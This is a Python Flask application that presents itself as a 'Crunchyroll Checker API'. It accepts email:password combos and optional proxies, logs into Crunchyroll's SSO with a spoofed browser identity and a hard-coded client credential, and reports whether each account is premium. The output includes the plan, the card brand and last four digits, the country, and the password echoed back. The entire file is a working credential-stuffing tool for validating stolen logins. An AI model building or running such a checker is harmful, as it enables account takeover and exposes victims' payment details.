from flask import Flask, request, jsonify
import requests
from datetime import datetime
import pytz

app = Flask(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
LODA = "bm9haWhkZXZtXzZpeWcwYThsMHE6"  # SSO Basic (for Authorization)

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    if "@" in proxy_string:
        if not proxy_string.startswith("http"):
            proxy_string = "http://" + proxy_string
        return {"http": proxy_string, "https": proxy_string}
    parts = proxy_string.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

def extract_details(session, token, account_id, proxies=None, ua=None):
    UA_final = ua or UA
    subs_headers = {
        "Host": "www.crunchyroll.com",
        "User-Agent": UA_final,
        "Accept": "application/json, text/plain, */*",
        "Authorization": f"Bearer {token}",
        "Referer": "https://www.crunchyroll.com/account/membership"
    }
    try:
        subs_res = session.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers=subs_headers,
            proxies=proxies,
            timeout=20
        )
        if subs_res.status_code != 200:
            return None, "Failed to fetch subscription"
        data = subs_res.json()
    except Exception as e:
        return None, f"Sub fetch error: {e}"

    if data.get("containerType") == "free":
        return {
            "message": "Free Account",
            "plan": "Free",
            "status": "free"
        }, None

    subscriptions = data.get("subscriptions", [])
    plan_text = plan_value = active_free_trial = next_renewal_date = status = "N/A"
    payment_info = payment_method_type = country_code = "N/A"

    if subscriptions:
        plan = subscriptions[0].get("plan", {})
        tier = plan.get("tier", {})
        plan_text = tier.get("text") or plan.get("name", {}).get("text") or tier.get("value") or plan.get("name", {}).get("value") or "N/A"
        plan_value = tier.get("value") or plan.get("name", {}).get("value") or "N/A"
        active_free_trial = str(subscriptions[0].get("activeFreeTrial", False))
        next_renewal_date = subscriptions[0].get("nextRenewalDate", "N/A")
        status = subscriptions[0].get("status", "N/A")

    payment = data.get("currentPaymentMethod", {})
    if payment:
        payment_type = payment.get("paymentMethodType", "")
        payment_name = payment.get("name", "")
        payment_last4 = payment.get("lastFour", "")
        country_code = payment.get("countryCode", "N/A")
        if payment_type == "credit_card" and payment_name and payment_last4:
            payment_info = f"{payment_name} ending in {payment_last4}"
        else:
            payment_info = payment_name or payment_type or "N/A"
        payment_method_type = payment_type or "N/A"
    else:
        # fallback for country (profile endpoint)
        try:
            profile_headers = {
                "User-Agent": UA,
                "Authorization": f"Bearer {token}",
            }
            profile_res = session.get(
                "https://www.crunchyroll.com/accounts/v1/me/profile",
                headers=profile_headers,
                proxies=proxies,
                timeout=10
            )
            if profile_res.status_code == 200:
                profile = profile_res.json()
                country_code = profile.get("preferred_territory") or profile.get("country") or "N/A"
        except Exception:
            pass

    if next_renewal_date not in ["N/A", "None"]:
        try:
            renewal_dt = datetime.strptime(next_renewal_date, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renewal_date = renewal_dt.strftime("%d-%m-%Y")
            ist = pytz.timezone("Asia/Kolkata")
            current_dt = datetime.now(ist)
            days_left = (renewal_dt.astimezone(ist) - current_dt).days
            if days_left < 0:
                days_left = 0
        except Exception:
            formatted_renewal_date = next_renewal_date
            days_left = "N/A"
    else:
        formatted_renewal_date = next_renewal_date
        days_left = "N/A"

    return {
        "plan": f"{plan_text}—{plan_value}",
        "payment": payment_info,
        "country": country_code,
        "trial": active_free_trial,
        "status": status,
        "renewal": formatted_renewal_date,
        "days_left": days_left
    }, None

def crunchyroll_account_details(email, password, proxy=None):
    session = requests.Session()
    proxies = format_proxy(proxy) if proxy else None

    # 1. SSO login
    login_headers = {
        "Host": "sso.crunchyroll.com",
        "User-Agent": UA,
        "Accept": "*/*",
        "Referer": "https://sso.crunchyroll.com/login",
        "Origin": "https://sso.crunchyroll.com",
        "Content-Type": "text/plain;charset=UTF-8",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    login_json = {
        "email": email,
        "password": password,
        "eventSettings": {}
    }
    try:
        login_res = session.post(
            "https://sso.crunchyroll.com/api/login",
            json=login_json,
            headers=login_headers,
            proxies=proxies,
            timeout=20
        )
        if "invalid_credentials" in login_res.text or login_res.status_code != 200:
            return {
                "message": "Invalid or Free Account",
                "status": "error"
            }
        device_id = login_res.cookies.get("device_id")
        if not device_id:
            return {
                "message": "Failed to get device_id",
                "status": "error"
            }
    except Exception as e:
        return {"message": f"SSO error: {e}", "status": "error"}

    # 2. Token fetch
    token_headers = {
        "Host": "www.crunchyroll.com",
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Basic {LODA}",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/"
    }
    token_data = {
        "device_id": device_id,
        "device_type": "Firefox on Windows",
        "grant_type": "etp_rt_cookie"
    }
    try:
        token_res = session.post(
            "https://www.crunchyroll.com/auth/v1/token",
            data=token_data,
            headers=token_headers,
            proxies=proxies,
            timeout=20
        )
        print("Token Endpoint Response:", token_res.text)  # <--- DEBUG LINE
        if token_res.status_code != 200:
            return {
                "message": "Failed to get token",
                "status": "error"
            }
        js = token_res.json()
        token = js.get("access_token")
        account_id = js.get("account_id")
        if not token or not account_id:
            return {
                "message": "Token or account_id missing",
                "status": "error"
            }
    except Exception as e:
        return {"message": f"Token error: {e}", "status": "error"}

    # 3. Extract account details
    details, error = extract_details(session, token, account_id, proxies=proxies, ua=UA)
    if error:
        return {"message": error, "status": "error"}
    if not details or details.get("plan") == "Free":
        return {
            "message": "Free Account",
            "account": email,
            "pass": password,
            "country": details.get("country") if details else "N/A",
            "plan": "Free",
            "payment": "N/A",
            "trial": details.get("trial") if details else "N/A",
            "status": details.get("status") if details else "free",
            "renewal": details.get("renewal") if details else "N/A",
            "days_left": details.get("days_left") if details else "N/A"
        }
    # Success
    return {
        "message": "✅ Premium Account",
        "account": email,
        "pass": password,
        "country": details.get("country", "N/A"),
        "plan": details.get("plan", "N/A"),
        "payment": details.get("payment", "N/A"),
        "trial": details.get("trial", "N/A"),
        "status": details.get("status", "N/A"),
        "renewal": details.get("renewal", "N/A"),
        "days_left": details.get("days_left", "N/A")
    }

@app.route("/check", methods=["GET", "POST"])
def check():
    combo = request.values.get("email", "").strip()
    proxy = request.values.get("proxy", "")

    if ":" not in combo or not combo:
        return jsonify({"status": "error", "message": "Use ?email=email:pass&proxy=proxy (proxy optional)"}), 400
    email, password = combo.split(":", 1)
    if not email or not password:
        return jsonify({"status": "error", "message": "Missing email or password"}), 400

    details = crunchyroll_account_details(email, password, proxy if proxy else None)
    return jsonify(details)

@app.route("/")
def home():
    return "<h3>Crunchyroll Checker API<br>Use /check?email=email:pass&proxy=proxy</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
